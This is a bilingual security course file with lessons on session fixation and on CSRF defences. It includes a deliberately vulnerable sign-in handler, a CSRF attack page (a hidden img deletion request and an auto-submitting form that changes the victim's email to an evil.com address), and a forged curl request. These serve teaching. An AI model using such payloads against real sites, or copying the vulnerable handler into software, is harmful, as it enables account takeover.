<h2>Phiên MỚI ở mỗi lần đổi mức đặc quyền</h2>
<p class="lead">Phần lớn bug xác thực nói về việc một tín vật BỊ CẮP. Session fixation thì NGƯỢC LẠI: kẻ tấn công <em>ĐƯA</em> cho nạn nhân một mã phiên, chờ họ đăng nhập bằng chính mã đó, rồi thừa hưởng một phiên đã xác thực mà chưa bao giờ nhìn thấy mật khẩu. Cách vá là MỘT dòng, và cái luật sinh ra nó phủ luôn vài tình huống khác rất dễ bỏ sót.</p>

<h3>Cú tấn công</h3>
<div class="lz-map">
  <div class="lz-stage">
    <span class="lz-badge">1 · Cắm</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">Kẻ tấn công GHIM một mã phiên</span><span class="lz-nsub">Một giá trị họ BIẾT, đặt vào trình duyệt nạn nhân</span></div></div>
  </div>
  <div class="lz-stage">
    <span class="lz-badge">2 · Chờ</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">Nạn nhân đăng nhập BÌNH THƯỜNG</span><span class="lz-nsub">Đúng mật khẩu, đúng MFA — chẳng có gì trông sai cả</span></div></div>
  </div>
  <div class="lz-stage">
    <span class="lz-badge">3 · Thừa hưởng</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">Chính cái mã đó giờ ĐÃ xác thực</span><span class="lz-nsub">Và kẻ tấn công vẫn cầm nó suốt từ đầu</span></div></div>
  </div>
</div>
<pre><code><span class="tok-comment">// ❌ Mẫu có lỗ hổng: dùng lại mã, chỉ gắn thêm người dùng vào</span>
app.post('/sign-in', async (req, res) =&gt; {
  const nd = await kiemTraMatKhau(req.body);
  await prisma.phien.update({
    where: { id: req.phien.id },              <span class="tok-comment">// ← CÙNG mã phiên</span>
    data:  { nguoiDungId: nd.id },            <span class="tok-comment">// ← chỉ gắn thêm người dùng</span>
  });
  res.json({ ok: true });
});</code></pre>
<div class="out"># Ke tan cong da cam ma phien do TU TRUOC khi nan nhan dang nhap.
# Bay gio no tro thanh mot phien DA XAC THUC, va ho van dang cam.
# Mat khau dung, MFA dung, va tai khoan van bi chiem.</div>

<h3>Cái mã đó được CẮM vào bằng cách nào</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Ném cookie từ một tên miền con</span><span class="v">Một <code>cu.vidu.com</code> bị chiếm hoặc chưa ai nhận có thể đặt một cookie tên <code>phien</code> cho tên miền cha. Tiền tố <code>__Host-</code> của Bài 3.2 chặn ĐÚNG chuyện này, vì một tên miền con không ghi được cookie <code>__Host-</code>.</span></div>
  <div class="kv"><span class="k">Mã phiên nằm trong URL</span><span class="v">Các framework cũ chấp nhận <code>?PHPSESSID=…</code> hay <code>;jsessionid=…</code> để trình duyệt không có cookie vẫn chạy được. Khi đó chỉ cần một cái LIÊN KẾT là đủ. ĐỪNG BAO GIỜ đọc token phiên từ một tham số truy vấn — cookie hoặc header <code>Authorization</code>, không gì khác.</span></div>
  <div class="kv"><span class="k">XSS ở BẤT KỲ đâu trên origin</span><span class="v">Nếu một script chạy được thì nó ghi được <code>document.cookie</code>. <code>HttpOnly</code> ngăn việc ĐỌC chứ không ngăn việc GHI một cookie tên KHÁC — và việc ghi đè cùng tên mới là thứ tiền tố <code>__Host-</code> chặn.</span></div>
  <div class="kv"><span class="k">Một máy dùng chung hoặc máy công cộng</span><span class="v">Phiên bản ít công nghệ nhất: đăng nhập trên máy ở thư viện, không đăng xuất, và người kế tiếp có phiên của bạn. Hết hạn nhàn rỗi của Bài 3.1 chặn trần được nó; tái sinh mã thì không giúp ở đây, nhưng THU HỒI thì có.</span></div>
</div>

<h3>Cách vá</h3>
<pre><code><span class="tok-comment">// ✅ Thu hồi cái cũ, cấp cái MỚI. Bốn dòng.</span>
app.post('/sign-in', async (req, res) =&gt; {
  const nd = await kiemTraMatKhau(req.body);

  if (req.phien) {
    await prisma.phien.update({
      where: { id: req.phien.id }, data: { thuHoiLuc: new Date() },
    });
  }
  const token = await taoPhien(nd.id, req);      <span class="tok-comment">// mã HOÀN TOÀN mới</span>
  datCookiePhien(res, token);

  res.json({ ok: true });
});</code></pre>
<div class="out">Set-Cookie: __Host-phien=Kc9x2Lm…; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=2592000

# Ma ke tan cong dang cam gio da bi thu hoi va tro nen vo dung.
# Nan nhan cam mot ma moi ma ke tan cong chua bao gio thay.</div>
<div class="callout ok">
<p><strong>Cái luật, nói một lần cho xong: ĐỪNG BAO GIỜ nâng mức đặc quyền của một phiên đang có — hãy THAY nó.</strong> Bất kỳ khoảnh khắc nào mà "phiên này làm được gì" TĂNG LÊN đều là khoảnh khắc cần một mã phiên mới. Không chỉ mỗi lúc đăng nhập: còn là lúc hoàn tất MFA, lúc đổi mật khẩu, lúc một quản trị viên mượn danh tính người khác, và lúc chấp nhận một lời mời có kèm vai trò. Nếu câu trả lời cho "kẻ tấn công CÓ THỂ đã biết cái mã này trước khi đặc quyền tăng lên không?" mà không phải một chữ KHÔNG chắc chắn, thì hãy xoay mã.</p>
</div>

<h3>Còn áp ở đâu nữa</h3>
<div class="lz-flow">
  <div class="lz-step"><span class="lz-k">Sau MFA</span><span class="lz-t">Yếu tố thứ hai NÂNG đặc quyền</span><span class="lz-d">Một phiên trước-MFA chỉ vào được <code>/mfa</code> nay trở thành một phiên xác thực đầy đủ. Đó là một cú TĂNG đặc quyền, nên nó phải có mã mới — và phiên trước-MFA nên bị THU HỒI chứ không phải nâng cấp.</span></div>
  <div class="lz-step"><span class="lz-k">Sau khi đổi mật khẩu</span><span class="lz-t">Và thu hồi những phiên còn lại</span><span class="lz-d">Yêu cầu của Bài 2.3: cấp một phiên mới cho trình duyệt hiện tại, thu hồi MỌI phiên khác của người dùng đó. Đó là thứ làm cho câu "hãy đổi mật khẩu đi" trở thành một phản ứng CÓ NGHĨA trước một nghi ngờ bị chiếm.</span></div>
  <div class="lz-step"><span class="lz-k">Khi đổi vai trò</span><span class="lz-t">Nhất là khi HẠ xuống</span><span class="lz-d">Nâng một người lên admin thì NÊN xoay mã; <em>HẠ</em> một người xuống thì BẮT BUỘC, và còn phải thu hồi những phiên đang có của họ — nếu không thì cái người vừa bị gỡ quyền admin vẫn giữ quyền truy cập cho tới khi phiên tự hết hạn.</span></div>
  <div class="lz-step"><span class="lz-k">Khi mượn danh tính</span><span class="lz-t">Cả hai chiều</span><span class="lz-d">"Xem với tư cách người dùng" trong một công cụ quản trị tạo ra một danh tính KHÁC. Hãy cho nó một phiên riêng có dấu hiệu tường minh, và xoay mã lần nữa lúc quay về. Dùng chung một mã giữa quản trị viên và người bị mượn danh, nhẹ nhất thì cũng là một nhật ký kiểm toán rối rắm.</span></div>
</div>

<h3>Mang trạng thái ẩn danh đi theo</h3>
<pre><code><span class="tok-comment">// Người dùng có giỏ hàng TRƯỚC khi đăng nhập. Chuyển DỮ LIỆU, không chuyển MÃ.</span>
app.post('/sign-in', async (req, res) =&gt; {
  const gioCu = req.phien?.id;                    <span class="tok-comment">// giữ lại id CŨ để đọc dữ liệu</span>
  const nd = await kiemTraMatKhau(req.body);

  await prisma.$transaction(async (tx) =&gt; {
    if (gioCu) {
      await tx.gioHang.updateMany({
        where: { phienId: gioCu }, data: { nguoiDungId: nd.id, phienId: null },
      });
      await tx.phien.update({ where: { id: gioCu }, data: { thuHoiLuc: new Date() } });
    }
  });

  datCookiePhien(res, await taoPhien(nd.id, req));
});</code></pre>
<div class="pitfall">
<p><strong>Bẫy — một phiên ẩn danh SỐNG SÓT qua lần đăng nhập chính là lỗ hổng đang khoác áo tính năng.</strong> "Giữ lại giỏ hàng" là một yêu cầu THẬT, và bản cài đặt SAI của nó — giữ nguyên mã phiên để cái giỏ vẫn dính vào — chính xác là con bug fixation. Hãy chuyển những HÀNG dữ liệu sang cho người dùng, thu hồi phiên cũ, cấp phiên mới. Người dùng thấy giỏ hàng của họ; còn cái mã kẻ tấn công cắm vào thì đã chết.</p>
</div>

<h3>Xác thực theo bậc: chứng minh vẫn là bạn</h3>
<pre><code><span class="tok-comment">// Thêm một cột trên Phien, và một middleware</span>
model Phien {
  <span class="tok-comment">// …</span>
  xacThucLuc DateTime   <span class="tok-comment">// lần cuối người dùng CHỨNG MINH danh tính</span>
}

export function canXacThucLai(phutToiDa: number) {
  return (req, res, next) =&gt; {
    const tuoi = Date.now() - req.phien.xacThucLuc.getTime();
    if (tuoi &gt; phutToiDa * 60_000) {
      return res.status(403).json({ ma: 'CAN_XAC_THUC_LAI', phutToiDa });
    }
    next();
  };
}

app.post('/account/change-email',  requireAuth, canXacThucLai(5), doiEmail);
app.post('/account/delete',        requireAuth, canXacThucLai(5), xoaTaiKhoan);
app.post('/thanh-toan/rut-tien',  requireAuth, canXacThucLai(2), rutTien);</code></pre>
<div class="lz-stack">
  <div class="lz-layer"><span class="lz-lname">Nó phòng cú CẮP PHIÊN, không phòng cú cắp mật khẩu</span><span class="lz-lnote">Kẻ tấn công cầm một cookie bị chiếm thì ĐỌC được mọi thứ, nhưng KHÔNG đổi được email hay xoá được tài khoản nếu không trình ra mật khẩu. Đó chính là khoảng cách giữa "phiên bị chiếm" và "mất tài khoản", và nó đáng để dựng.</span></div>
  <div class="lz-layer"><span class="lz-lname">Hành động nào cần tới nó</span><span class="lz-lnote">Bất cứ thứ gì làm thay đổi CÁCH KHÔI PHỤC tài khoản — email, số điện thoại, mật khẩu, thiết bị MFA, mã khôi phục — cộng bất cứ thứ gì không hoàn tác được hoặc dính tiền. KHÔNG phải "mọi thứ nhạy cảm": hỏi quá nhiều thì người dùng ngừng đọc.</span></div>
  <div class="lz-layer"><span class="lz-lname">Hãy CẬP NHẬT <code>xacThucLuc</code>, đừng xoay mã</span><span class="lz-lnote">Xác thực lại là XÁC NHẬN phiên đang có chứ không nâng đặc quyền của nó, nên cái mã giữ nguyên. Hãy đặt <code>xacThucLuc = now()</code> khi thành công. Xoay mã là cho việc <em>TĂNG</em> đặc quyền; cái này là <em>XÁC NHẬN</em> đặc quyền.</span></div>
  <div class="lz-layer"><span class="lz-lname">Đây chính là <code>auth_time</code> và <code>max_age</code> của OIDC</span><span class="lz-lnote">Cùng một ý tưởng đã được chuẩn hoá: một nhà cung cấp danh tính báo lại thời điểm người dùng THẬT SỰ xác thực, và bên tin cậy có thể đòi một lần xác thực mới. Chương 8 dùng nó; cơ chế ở đây là bản CỤC BỘ của cùng một yêu cầu.</span></div>
</div>
<div class="note-ct">
<p><strong>Ba dòng bịt được phần lớn chuyện này.</strong> Dùng tiền tố <code>__Host-</code> để một tên miền con không cắm được cookie · ĐỪNG BAO GIỜ đọc token phiên từ URL · và lúc đăng nhập thì THU HỒI phiên cũ rồi CẤP phiên mới, thay vì cập nhật cái hàng đang có. Session fixation đã là một cú tấn công được biết từ những năm 1990 và nó cứ xuất hiện lại, gần như luôn luôn vì "cập nhật phiên với id người dùng" là đoạn mã NGẮN NHẤT làm cho việc đăng nhập chạy được.</p>
</div>

<h3>Nguồn học cho bài này</h3>
<a class="link-card" href="https://owasp.org/www-community/attacks/Session_fixation" target="_blank" rel="noopener"><span class="lc-ico">📌</span><span class="lc-body"><span class="lc-title">OWASP — session fixation</span><span class="lc-sub">owasp.org · Cú tấn công, các biến thể, và yêu cầu tái sinh mã</span></span></a>
<a class="link-card" href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#renew-the-session-id-after-any-privilege-level-change" target="_blank" rel="noopener"><span class="lc-ico">🔄</span><span class="lc-body"><span class="lc-title">OWASP — làm mới mã sau khi đổi đặc quyền</span><span class="lc-sub">cheatsheetseries.owasp.org · Danh sách đầy đủ những khoảnh khắc đòi một mã mới</span></span></a>
<a class="link-card" href="https://openid.net/specs/openid-connect-core-1_0.html#AuthRequest" target="_blank" rel="noopener"><span class="lc-ico">⏱️</span><span class="lc-body"><span class="lc-title">OIDC — max_age và auth_time</span><span class="lc-sub">openid.net · Xác thực theo bậc, chuẩn hoá giữa các bên</span></span></a>
<a class="link-card" href="https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html" target="_blank" rel="noopener"><span class="lc-ico">🔐</span><span class="lc-body"><span class="lc-title">OWASP — cheat sheet về MFA</span><span class="lc-sub">cheatsheetseries.owasp.org · Yếu tố thứ hai thuộc về chỗ nào trong luồng</span></span></a>
<a class="link-card codelab" href="/code-lab/tracks/authentication${REF}"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Code Lab — track "Authentication"</span><span class="lc-sub">Ghim một phiên vào nạn nhân, xem nó trở thành đã-xác-thực, rồi thêm bốn dòng vá</span></span></a>
</div>
`,
    },
    /* ─────────────────────────── 3.4 ─────────────────────────── */
    {
      title: '3.4 — CSRF, and the three defences ranked|||3.4 — CSRF, và ba lớp phòng xếp theo thứ tự',
      slug: 'auth-3-4-csrf',
      type: 'LESSON',
      description: 'CSRF tồn tại vì trình duyệt TỰ ĐỘNG đính cookie vào, và kẻ tấn công không cần ĐỌC phản hồi — chỉ cần GÂY RA request. Bài này chỉ ra vì sao CORS không phải một lớp phòng CSRF, rồi xếp ba lớp phòng THẬT theo thứ tự nên áp: SameSite, kiểm Sec-Fetch-Site/Origin, và token đồng bộ khi hai cái kia không đủ.',
      content: `
<div class="ml-en">
<span class="eyebrow">Chapter 3 · Lesson 3.4</span>
<h2>CSRF, and the three defences ranked</h2>
<p class="lead">Cross-site request forgery works because of a convenience: the browser attaches your cookies to a request no matter which page caused it. The attacker never sees the response and does not need to — the damage is in the request. Understanding that one sentence is what makes the three defences below obviously correct, and what makes the popular non-defences obviously wrong.</p>

<h3>The attack, in its two shapes</h3>
<pre><code><span class="tok-comment">&lt;!-- Trên trang của kẻ tấn công. Nạn nhân chỉ cần MỞ trang này. --&gt;</span>

<span class="tok-comment">&lt;!-- 1. GET, giấu trong một cái ảnh --&gt;</span>
&lt;img src="https://vidu.com/api/xoa-tai-khoan" width="1" height="1"&gt;

<span class="tok-comment">&lt;!-- 2. POST, tự gửi --&gt;</span>
&lt;form action="https://vidu.com/api/doi-email" method="POST"&gt;
  &lt;input name="email" value="ke-tan-cong@evil.com"&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</code></pre>
<div class="out">Request tren duong day:

POST /api/doi-email HTTP/1.1
Host: vidu.com
Origin: https://evil.com                 ← trang GAY RA no
Cookie: __Host-phien=Kc9x2Lm…            ← trinh duyet TU DINH VAO
Content-Type: application/x-www-form-urlencoded

email=ke-tan-cong%40evil.com

# May chu nhin thay mot phien hop le. Vi no LA mot phien hop le.</div>
<div class="lz-flow">
  <div class="lz-step"><span class="lz-k">The attacker cannot read</span><span class="lz-t">And does not need to</span><span class="lz-d">The same-origin policy stops <code>evil.com</code> reading the response. It does not stop the request being sent, and for "change my email", "delete this", "transfer money", sending is the whole attack.</span></div>
  <div class="lz-step"><span class="lz-k">A GET that changes state is the worst case</span><span class="lz-t">One <code>&lt;img&gt;</code> tag</span><span class="lz-d">No script needed, works in an email client, works in a comment on someone else's site. Make every state-changing endpoint a POST, PUT, PATCH or DELETE — that alone removes the easiest version.</span></div>
  <div class="lz-step"><span class="lz-k">Login CSRF is real too</span><span class="lz-t">And usually forgotten</span><span class="lz-d">The attacker forces <em>you</em> to log into <em>their</em> account, then watches what you do in it — search history, uploaded files, a saved payment method you add. The login endpoint needs CSRF protection just like the others.</span></div>
  <div class="lz-step"><span class="lz-k">Logout CSRF is minor and annoying</span><span class="lz-t">Protect it anyway</span><span class="lz-d">Not a security disaster, but a site that can be logged out from anywhere is a site that can be made unusable. It is one line to include it in the same protection.</span></div>
</div>

<h3>Why CORS is not a CSRF defence</h3>
<pre><code><span class="tok-comment">// Ba loại Content-Type mà một &lt;form&gt; gửi được — KHÔNG có JSON</span>
application/x-www-form-urlencoded
multipart/form-data
text/plain

<span class="tok-comment">// Những cái đó là "request đơn giản": KHÔNG có preflight.</span>
<span class="tok-comment">// CORS chặn kẻ tấn công ĐỌC phản hồi. Request thì vẫn ĐI TỚI.</span></code></pre>
<div class="out">$ curl -i https://vidu.com/api/doi-email -H 'Origin: https://evil.com' \\
    -d 'email=x@evil.com' --cookie 'phien=…'

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://vidu.com     ← trinh duyet SE chan viec doc

# Nhung email DA doi roi. Phan hoi bi chan chang cuu duoc gi.</div>
<div class="callout warn">
<p><strong>"We have CORS configured" is the most common wrong answer to CSRF.</strong> CORS is a rule about who may <em>read</em> a cross-origin response. A form submission is not subject to it at all, and a simple <code>fetch</code> with <code>credentials: 'include'</code> and a form content type reaches your handler before any CORS check matters. CORS is worth configuring correctly for other reasons; it is not this.</p>
</div>

<h3>Defence 1 — <code>SameSite=Lax</code>, always</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">What it covers</span><span class="v">Every cross-site POST, every iframe, every image, every <code>fetch</code> from another site. That is the whole attack surface above, blocked by the browser at no cost to you.</span></div>
  <div class="kv"><span class="k">What it misses: your own subdomains</span><span class="v">"Same site" is the registrable domain, so a request from <code>blog.vidu.com</code> to <code>app.vidu.com</code> is <em>same-site</em> and the cookie is sent. If any subdomain is less trusted than the main app, <code>SameSite</code> is not protecting you from it.</span></div>
  <div class="kv"><span class="k">What it misses: <code>SameSite=None</code></span><span class="v">If your product is genuinely embedded cross-site, you set <code>None</code> and this defence is gone by definition. Then defence 3 is not optional.</span></div>
  <div class="kv"><span class="k">Set it explicitly</span><span class="v">Chrome defaults to <code>Lax</code>, other browsers vary by version, and defaults change. An explicit <code>sameSite: 'lax'</code> costs nothing and does not depend on which browser your user has.</span></div>
</div>

<h3>Defence 2 — check where the request came from</h3>
<pre><code><span class="tok-comment">// Sec-Fetch-Site: trình duyệt TỰ nói ra ngữ cảnh, không giả được từ JS</span>
export function chanXuyenTrang(req, res, next) {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();

  const nguon = req.get('sec-fetch-site');
  if (nguon) {
    <span class="tok-comment">// same-origin | same-site | cross-site | none (gõ URL, bookmark)</span>
    if (nguon === 'same-origin' || nguon === 'none') return next();
    return res.status(403).json({ loi: 'Nguon xuyen trang' });
  }

  <span class="tok-comment">// Trình duyệt cũ: lùi về Origin</span>
  const origin = req.get('origin');
  if (!origin) return res.status(403).json({ loi: 'Thieu Origin' });
  if (!DUOC_PHEP.has(origin)) return res.status(403).json({ loi: 'Origin la' });
  next();
}</code></pre>
<div class="out">Truy cap binh thuong  → Sec-Fetch-Site: same-origin  → cho qua ✅
Form tu evil.com      → Sec-Fetch-Site: cross-site    → 403 ✅
Tu blog.vidu.com      → Sec-Fetch-Site: same-site     → 403 ✅  (chat hon SameSite)
Go URL / bookmark     → Sec-Fetch-Site: none          → cho qua ✅
Postman, curl         → khong co header nao           → xu ly rieng</div>
<div class="lz-stack">
  <div class="lz-layer"><span class="lz-lname">It is stateless and free</span><span class="lz-lnote">No token to generate, store, rotate or synchronise across tabs. One middleware, applied to every mutating method, and it covers the same-site subdomain case that <code>SameSite=Lax</code> does not.</span></div>
  <div class="lz-layer"><span class="lz-lname"><code>Sec-Fetch-*</code> is a forbidden header name</span><span class="lz-lnote">JavaScript cannot set or modify it, so a page cannot lie about its context. That is what makes it trustworthy in a way <code>Referer</code> — which can be suppressed by a referrer policy — is not.</span></div>
  <div class="lz-layer"><span class="lz-lname">Decide what "no header at all" means</span><span class="lz-lnote">A native app, a server-to-server call and <code>curl</code> send neither header. If your API serves those, authenticate them with a bearer token rather than a cookie and exempt that path — the CSRF problem is specific to <em>automatically attached</em> credentials.</span></div>
  <div class="lz-layer"><span class="lz-lname">Requiring JSON helps, as a second lock</span><span class="lz-lnote">A <code>&lt;form&gt;</code> cannot send <code>Content-Type: application/json</code>, so rejecting anything else blocks the form-based attack. Verify the header rather than trusting your parser to have required it, and treat this as defence in depth, not as the defence.</span></div>
</div>

<h3>Defence 3 — a token, when the first two are not enough</h3>
<pre><code><span class="tok-comment">// Double-submit CÓ KÝ: ràng token vào phiên, nên tên miền con không giả được</span>
import { createHmac, timingSafeEqual, randomBytes } from 'node:crypto';

export function phatTokenCsrf(res, phienId: string) {
  const ma = randomBytes(16).toString('base64url');
  const chuKy = createHmac('sha256', KHOA_CSRF).update(&#96;\${phienId}.\${ma}&#96;).digest('base64url');
  const token = &#96;\${ma}.\${chuKy}&#96;;

  res.cookie('__Host-csrf', token, {
    secure: true, sameSite: 'lax', path: '/',
    httpOnly: false,        <span class="tok-comment">// front end PHẢI đọc được để gửi lại trong header</span>
  });
  return token;
}

export function kiemTokenCsrf(req, res, next) {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();

  const tuHeader = String(req.get('x-csrf-token') ?? '');
  const tuCookie = String(req.cookies['__Host-csrf'] ?? '');
  if (!tuHeader || tuHeader !== tuCookie) return res.status(403).end();

  const [ma, chuKy] = tuHeader.split('.');
  const mong = createHmac('sha256', KHOA_CSRF)
    .update(&#96;\${req.phien.id}.\${ma}&#96;).digest('base64url');

  const a = Buffer.from(chuKy ?? ''), b = Buffer.from(mong);
  if (a.length !== b.length || !timingSafeEqual(a, b)) return res.status(403).end();
  next();
}</code></pre>
<div class="pitfall">
<p><strong>Trap — unsigned double-submit is broken by any subdomain that can set cookies.</strong> The naive version compares a cookie against a header and accepts them if they match — but an attacker who controls <code>cu.vidu.com</code> can set <em>both</em> to a value they chose, and the check passes. Binding the token to the session id with an HMAC, as above, makes a forged pair fail because the attacker cannot compute the signature for the victim's session. If you use double-submit, sign it.</p>
</div>
<div class="kv-grid">
  <div class="kv"><span class="k">When you actually need a token</span><span class="v"><code>SameSite=None</code> because you are embedded cross-site · a browser SPA on a different origin sending cookies · a compliance requirement that names it · or an untrusted subdomain you cannot move.</span></div>
  <div class="kv"><span class="k">When you do not</span><span class="v">One origin, <code>SameSite=Lax</code>, <code>__Host-</code> cookies, and the origin check above. That combination stops every attack in this lesson, and a token adds a synchronisation problem across tabs for nothing.</span></div>
  <div class="kv"><span class="k">The token must be per-session, not global</span><span class="v">A value shared by all users is not a secret. Bind it to the session — that is the point of the HMAC — and rotate it when the session rotates (Lesson 3.3).</span></div>
  <div class="kv"><span class="k">Bearer tokens do not need CSRF protection</span><span class="v">If the credential travels in an <code>Authorization</code> header that your code adds explicitly, the browser never attaches it automatically and CSRF does not apply. That is a genuine advantage of Chapter 4's approach — paid for with the XSS exposure discussed there.</span></div>
</div>
<div class="note-ct">
<p><strong>The order to implement, and where to stop.</strong> First <code>SameSite=Lax</code> with the <code>__Host-</code> prefix — one line, covers the common case. Then the <code>Sec-Fetch-Site</code> middleware — one file, covers the subdomain case and costs nothing per request. Then stop, unless one of the four conditions above applies to you. Most applications reach for a CSRF token library first and end up with all the complexity and, because they left <code>SameSite</code> unset, less protection than the one-line version would have given.</p>
</div>

<h3>Learning sources for this lesson</h3>
<a class="link-card" href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener"><span class="lc-ico">🛡️</span><span class="lc-body"><span class="lc-title">OWASP — CSRF prevention</span><span class="lc-sub">cheatsheetseries.owasp.org · Every defence, ranked, including the ones that do not work</span></span></a>
<a class="link-card" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Sec-Fetch-Site" target="_blank" rel="noopener"><span class="lc-ico">🧭</span><span class="lc-body"><span class="lc-title">MDN — Sec-Fetch-Site</span><span class="lc-sub">developer.mozilla.org · The four values, and why script cannot forge them</span></span></a>
<a class="link-card" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS#simple_requests" target="_blank" rel="noopener"><span class="lc-ico">🚦</span><span class="lc-body"><span class="lc-title">MDN — simple requests and preflight</span><span class="lc-sub">developer.mozilla.org · Exactly which requests skip the preflight, and why that matters here</span></span></a>
<a class="link-card" href="https://portswigger.net/web-security/csrf" target="_blank" rel="noopener"><span class="lc-ico">🔬</span><span class="lc-body"><span class="lc-title">PortSwigger — CSRF</span><span class="lc-sub">portswigger.net · Working labs, including bypasses of half-implemented defences</span></span></a>
<a class="link-card" href="/courses/nodejs/learn${REF}"><span class="lc-ico">🟢</span><span class="lc-body"><span class="lc-title">CuongThai course — Node.js</span><span class="lc-sub">CORS, security headers and CSP, from the Express side</span></span></a>
<a class="link-card codelab" href="/code-lab/tracks/authentication${REF}"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Code Lab — track "Authentication"</span><span class="lc-sub">Run a working CSRF against a real endpoint, then add each defence and re-run</span></span></a>
</div>

<div class="ml-vi">
<span class="eyebrow">Chương 3 · Bài 3.4</span>
<h2>CSRF, và ba lớp phòng xếp theo thứ tự</h2>
<p class="lead">Giả mạo request xuyên trang hoạt động được nhờ một TIỆN NGHI: trình duyệt đính cookie của bạn vào một request bất kể TRANG NÀO gây ra nó. Kẻ tấn công không bao giờ nhìn thấy phản hồi và cũng không cần — thiệt hại nằm ngay trong cái REQUEST. Hiểu đúng một câu đó là thứ làm cho ba lớp phòng bên dưới trở nên hiển nhiên đúng, và làm cho những "lớp phòng" phổ biến kia hiển nhiên sai.</p>

<h3>Cú tấn công, ở hai hình dạng của nó</h3>
<pre><code><span class="tok-comment">&lt;!-- Trên trang của kẻ tấn công. Nạn nhân chỉ cần MỞ trang này. --&gt;</span>

<span class="tok-comment">&lt;!-- 1. GET, giấu trong một cái ảnh --&gt;</span>
&lt;img src="https://vidu.com/api/xoa-tai-khoan" width="1" height="1"&gt;

<span class="tok-comment">&lt;!-- 2. POST, tự gửi --&gt;</span>
&lt;form action="https://vidu.com/api/doi-email" method="POST"&gt;
  &lt;input name="email" value="ke-tan-cong@evil.com"&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</code></pre>
<div class="out">Request tren duong day:

POST /api/doi-email HTTP/1.1
Host: vidu.com
Origin: https://evil.com                 ← trang GAY RA no
Cookie: __Host-phien=Kc9x2Lm…            ← trinh duyet TU DINH VAO
Content-Type: application/x-www-form-urlencoded

email=ke-tan-cong%40evil.com

# May chu nhin thay mot phien hop le. Vi no LA mot phien hop le.</div>
<div class="lz-flow">
  <div class="lz-step"><span class="lz-k">Kẻ tấn công KHÔNG đọc được</span><span class="lz-t">Và họ không cần đọc</span><span class="lz-d">Chính sách cùng-origin chặn <code>evil.com</code> ĐỌC phản hồi. Nó KHÔNG chặn việc request được GỬI ĐI, và với "đổi email của tôi", "xoá cái này", "chuyển tiền", thì GỬI ĐI chính là toàn bộ cú tấn công.</span></div>
  <div class="lz-step"><span class="lz-k">Một GET làm thay đổi trạng thái là ca TỆ NHẤT</span><span class="lz-t">Chỉ một thẻ <code>&lt;img&gt;</code></span><span class="lz-d">Không cần script, chạy được trong ứng dụng email, chạy được trong một bình luận trên trang của người khác. Hãy làm cho MỌI endpoint đổi trạng thái thành POST, PUT, PATCH hay DELETE — riêng điều đó đã xoá đi phiên bản dễ nhất.</span></div>
  <div class="lz-step"><span class="lz-k">CSRF ở ĐĂNG NHẬP cũng có thật</span><span class="lz-t">Và thường bị quên</span><span class="lz-d">Kẻ tấn công ép <em>BẠN</em> đăng nhập vào tài khoản của <em>HỌ</em>, rồi xem bạn làm gì trong đó — lịch sử tìm kiếm, file bạn tải lên, một phương thức thanh toán bạn vừa lưu. Endpoint đăng nhập cần bảo vệ CSRF y như những cái khác.</span></div>
  <div class="lz-step"><span class="lz-k">CSRF ở ĐĂNG XUẤT thì nhẹ mà khó chịu</span><span class="lz-t">Cứ bảo vệ luôn</span><span class="lz-d">Không phải thảm hoạ bảo mật, nhưng một trang mà ai cũng đăng xuất được bạn từ xa là một trang có thể bị làm cho không dùng nổi. Gộp nó vào cùng lớp bảo vệ chỉ tốn một dòng.</span></div>
</div>

<h3>Vì sao CORS KHÔNG phải một lớp phòng CSRF</h3>
<pre><code><span class="tok-comment">// Ba loại Content-Type mà một &lt;form&gt; gửi được — KHÔNG có JSON</span>
application/x-www-form-urlencoded
multipart/form-data
text/plain

<span class="tok-comment">// Những cái đó là "request đơn giản": KHÔNG có preflight.</span>
<span class="tok-comment">// CORS chặn kẻ tấn công ĐỌC phản hồi. Request thì vẫn ĐI TỚI.</span></code></pre>
<div class="out">$ curl -i https://vidu.com/api/doi-email -H 'Origin: https://evil.com' \\
    -d 'email=x@evil.com' --cookie 'phien=…'

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://vidu.com     ← trinh duyet SE chan viec doc

# Nhung email DA doi roi. Phan hoi bi chan chang cuu duoc gi.</div>
<div class="callout warn">
<p><strong>"Bọn tôi có cấu hình CORS rồi" là câu trả lời SAI phổ biến nhất cho CSRF.</strong> CORS là một luật về việc AI được <em>ĐỌC</em> một phản hồi xuyên origin. Một lần gửi form thì hoàn toàn KHÔNG chịu luật đó, và một lời gọi <code>fetch</code> đơn giản với <code>credentials: 'include'</code> cùng một content type dạng form sẽ tới được handler của bạn TRƯỚC khi bất kỳ phép kiểm CORS nào có ý nghĩa. CORS đáng được cấu hình đúng vì những lý do khác; nó không phải lý do này.</p>
</div>

<h3>Lớp phòng 1 — <code>SameSite=Lax</code>, luôn luôn</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Nó phủ được gì</span><span class="v">Mọi POST xuyên trang, mọi iframe, mọi ảnh, mọi lời gọi <code>fetch</code> từ trang khác. Đó là toàn bộ bề mặt tấn công ở trên, bị TRÌNH DUYỆT chặn mà bạn không tốn gì.</span></div>
